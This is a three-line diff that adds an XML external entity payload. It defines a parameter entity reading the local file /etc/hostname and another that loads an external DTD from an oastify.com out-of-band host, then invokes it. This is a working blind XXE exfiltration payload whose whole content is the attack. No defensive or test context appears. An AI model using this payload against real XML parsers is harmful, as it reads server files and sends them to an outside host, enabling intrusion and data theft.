@@ -1,0 +1,3 @@
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % dtd SYSTEM "dfwxjba6a19gzmyniauprsb6zx5otfh4.oastify.com">
+%dtd;
